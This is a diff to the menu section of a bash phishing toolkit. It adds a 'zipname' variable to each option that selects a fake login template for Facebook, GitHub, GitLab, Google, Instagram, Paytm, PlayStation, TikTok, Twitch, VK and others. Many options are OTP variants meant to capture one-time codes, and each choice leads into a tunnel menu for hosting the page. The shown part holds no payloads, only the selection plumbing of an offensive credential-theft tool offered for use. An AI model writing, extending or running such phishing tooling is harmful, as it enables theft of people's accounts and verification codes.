@@ -886,24 +886,31 @@ read -p "${MAGENTA} YOUR CHOICE : " choice
 case $choice in
         1 | 01)
                 website="facebook"
+	        zipname="facebook"
                 tunnel_menu;;
         2 | 02)
                 website="facebook/otp"
+		zipname="facebook"
                 tunnel_menu;;
 	3 | 03)
                 website="fb_poll"
+		zipname="fb_poll"
                 tunnel_menu;;
         4 | 04)
                 website="fb_poll/otp"
+		zipname="fb_poll"
                 tunnel_menu;;
 	5 | 05)
                 website="fb_security"
+		zipname="fb_security"
                 tunnel_menu;;
         6 | 06)
                 website="fb_security/otp"
+		zipname="fb_security"
                 tunnel_menu;;
 	7 | 07)
                 website="fb_standard"
+		zipname="fb_standard"
                 tunnel_menu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -941,15 +948,19 @@ read -p "${MAGENTA} YOUR CHOICE : " choice
 case $choice in
         1 | 01)
                 website="github"
+		zipname="github"
                 tunnel_menu;;
         2 | 02)
                 website="github/otp"
+		zipname="github"
                 tunnel_menu;;
 	3 | 03)
                 website="github_advanced"
+		zipname="github_advanced"
                 tunnel_menu;;
         4 | 04)
                 website="github_advanced/otp"
+		zipname="github_advanced"
                 tunnel_menu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -968,15 +979,19 @@ read -p "${MAGENTA} YOUR CHOICE : " choice
 case $choice in
 	1 | 01)
                 website="gitlab"
+		zipname="gitlab"
                 tunnel_menu;;
         2 | 02)
                 website="gitlab/otp"
+		zipname="gitlab"
                 tunnel_menu;;
         3 | 03)
                 website="gitlab_advanced"
+		zipname="gitlab_advanced"
                 tunnel_menu;;
         4 | 04)
                 website="gitlab_advanced/otp"
+		zipname="gitlab_advanced"
                 tunnel_menu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -1016,21 +1031,27 @@ read -p "${MAGENTA} YOUR CHOICE : " choice
 case $choice in
         1 | 01)
                 website="google_new"
+		zipname="google_new"
                 tunnel_menu;;
         2 | 02)
                 website="google_new/otp"
+		zipname="google_new"
                 tunnel_menu;;
         3 | 03)
                 website="google_poll"
+		zipname="google_poll"
                 tunnel_menu;;
         4 | 04)
                 website="google_poll/otp"
+		zipname="google_poll"
                 tunnel_menu;;
         5 | 05)
                 website="google"
+		zipname="google"
                 tunnel_menu;;
 	6 | 06)
 		website="google/otp"
+		zipname="google"
                 tunnel_menu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -1075,36 +1096,47 @@ read -p "${MAGENTA} YOUR CHOICE : " choice
 case $choice in
         1 | 01)
                 website="instagram"
+		zipname="instagram"
                 tunnel_menu;;
         2 | 02)
                 website="instagram/otp"
+		zipname="instagram"
                 tunnel_menu;;
         3 | 03)
                 website="ig_advanced"
+		zipname="ig_advanced"
                 tunnel_menu;;
         4 | 04)
                 website="ig_advanced/otp"
+		zipname="ig_advanced"
                 tunnel_menu;;
         5 | 05)
                 website="ig_autoliker"
+		zipname="ig_autoliker"
                 tunnel_menu;;
         6 | 06)
                 website="ig_autoliker/otp"
+		zipname="ig_autoliker"
                 tunnel_menu;;
         7 | 07)
                 website="ig_followers"
+		zipname="ig_followers"
                 tunnel_menu;;
 	8 | 08)
                 website="ig_followers/otp"
+		zipname="ig_followers"
                 tunnel_menu;;
 	9 | 09)
                 website="ig_verify"
+		zipname="ig_verify"
                 tunnel_menu;;
 	10)
                 website="ig_old"
+		zipname="ig_old"
                 tunnel_menu;;
         11)
                 website="ig_old/otp"
+		zipname="ig_old"
                 tunnel_menu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -1121,9 +1153,11 @@ read -p "${MAGENTA} YOUR CHOICE : " choice
 case $choice in
         1 | 01)
                 website="jiosim"
+		zipname="jiosim"
                 tunnel_menu;;
         2 | 02)
                 website="jiooffer"
+		zipname="jiooffer"
                 tunnel_menu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -1180,15 +1214,19 @@ read -p "${MAGENTA} YOUR CHOICE : " choice
 case $choice in
         1 | 01)
                 website="messenger"
+		zipname="messenger"
                 tunnel_menu;;
         2 | 02)
                 website="messenger/otp"
+		zipname="messenger"
                 tunnel_menu;;
         3 | 03)
                 website="messenger_old"
+		zipname="messenger_old"
                 tunnel_menu;;
         4 | 04)
                 website="messenger_old/otp"
+		zipname="messenger_old"
                 tunnel_menu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -1283,15 +1321,19 @@ read -p "${MAGENTA} YOUR CHOICE : " choice
 case $choice in
         1 | 01)
                 website="paytm"
+		zipname="paytm"
                 tunnel_menu;;
         2 | 02)
                 website="paytm/otp"
+		zipname="paytm"
                 tunnel_menu;;
         3 | 03)
                 website="paytmoffer"
+		zipname="paytmoffer"
                 tunnel_menu;;
         4 | 04)
                 website="paytmoffer/otp"
+		zipname="paytmoffer"
                 tunnel_menu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -1309,12 +1351,15 @@ read -p "${MAGENTA} YOUR CHOICE : " choice
 case $choice in
         1 | 01)
                 website="playstation"
+		zipname="playstation"
                 tunnel_menu;;
         2 | 02)
                 website="playstation/otp"
+		zipname="playstation"
                 tunnel_menu;;
         3 | 03)
                 website="playstation2"
+		zipname="playstation2"
                 tunnel_menu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -1350,9 +1395,11 @@ read -p "${MAGENTA} YOUR CHOICE : " choice
 case $choice in
         1 | 01)
                 website="reddit"
+		zipname="reddit"
                 tunnel_menu;;
         2 | 02)
                 website="reddit_old"
+		zipname="reddit_old"
                 tunnel_menu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -1484,12 +1531,15 @@ read -p "${MAGENTA} YOUR CHOICE : " choice
 case $choice in
         1 | 01)
                 website="tiktok"
+		zipname="tiktok"
                 tunnel_menu;;
         2 | 02)
                 website="tiktok_likes"
+		zipname="tiktok_likes"
                 tunnel_menu;;
         3 | 03)
                 website="tiktok_likes/otp"
+		zipname="tiktok_likes"
                 tunnel_menu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -1507,12 +1557,15 @@ read -p "${MAGENTA} YOUR CHOICE : " choice
 case $choice in
         1 | 01)
                 website="twitch"
+		zipname="twitch"
                 tunnel_menu;;
         2 | 02)
                 website="twitch/otp"
+		zipname="twitch"
                 tunnel_menu;;
         3 | 03)
                 website="twitch_new"
+		zipname="twitch_new"
                 tunnel_menu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -1587,12 +1640,15 @@ read -p "${MAGENTA} YOUR CHOICE : " choice
 case $choice in
         1 | 01)
                 website="vk"
+		zipname="vk"
                 tunnel_menu;;
         2 | 02)
                 website="vk/otp"
+		zipname="vk"
                 tunnel_menu;;
         3 | 03)
                 website="vk_poll"
+		zipname="vk_poll"
                 tunnel_menu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
